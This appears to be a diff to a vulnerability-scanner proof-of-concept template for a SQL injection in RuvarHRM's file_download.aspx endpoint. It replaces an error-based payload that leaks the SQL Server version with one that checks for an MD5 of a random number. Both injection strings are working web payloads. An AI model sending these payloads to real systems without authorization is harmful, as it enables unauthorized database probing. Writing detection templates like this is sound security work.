@@ -1,10 +1,11 @@
 name: poc-yaml-ruvarhrm-filedownload-sqli
-
+set:
+  r: randomInt(800000000, 1000000000)
 rules:
   - method: GET
-    path: /RuvarHRM/web_common/file_download.aspx?hr_file_storage_id=1')and 1=convert(int,(char(71)+char(65)+char(79)+char(32)+char(74)+char(73)+char(64)+@@version ))--
+    path: /RuvarHRM/web_common/file_download.aspx?hr_file_storage_id=1')'and convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r}}')))>'0--
     expression: |
-      response.status == 200 && response.body.bcontains(b"GAO JI@Microsoft SQL Server")
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
 detail:
   author: durkworf(https://github.com/durkworf)
   links:
